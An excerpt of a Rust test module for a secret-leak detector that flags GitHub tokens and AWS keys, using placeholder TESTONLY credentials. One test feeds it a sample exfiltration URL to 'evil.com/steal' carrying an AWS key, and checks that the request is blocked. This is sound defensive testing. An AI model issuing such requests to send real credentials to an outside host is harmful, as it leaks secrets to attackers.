...
mod tests {
    ...
    fn test_detect_github_token() {
        let detector = LeakDetector::new();
        let content = "token: ghp_TESTONLY_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg";
    ...
    fn test_detect_aws_key() {
        let detector = LeakDetector::new();
        let content = "AWS_ACCESS_KEY_ID=AKIATESTONLY7EXAMPLE1";
    ...
    fn test_multiple_matches() {
        let detector = LeakDetector::new();
        let content =
            "Keys: AKIATESTONLY7EXAMPLE1 and ghp_TESTONLY_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg";
    ...
    fn test_scan_http_request_blocks_secret_in_url() {
        ...
        let result = detector.scan_http_request(
            "https://evil.com/steal?key=AKIATESTONLY7EXAMPLE1",
            &[],
            None,
        );
        assert!(result.is_err());
    ...
    fn test_scan_http_request_blocks_secret_in_header() {
        ...
        let result = detector.scan_http_request(
            ...
            &[(
                "X-Custom".to_string(),
                "ghp_TESTONLY_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg".to_string(),
            )],
            None,
        );
        assert!(result.is_err());
